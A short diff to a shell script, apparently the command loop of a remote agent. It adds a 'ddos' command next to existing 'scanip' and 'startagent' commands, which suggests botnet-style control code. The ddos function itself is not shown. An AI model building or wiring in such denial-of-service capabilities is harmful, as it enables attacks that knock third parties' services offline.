@@ -537,6 +537,9 @@ while true; do
         "scanip")
             scan_ip "$args"
             ;;
+         "ddos")
+            ddos "$args"
+            ;;
         "startagent")
             start_agent "$args"
             ;;
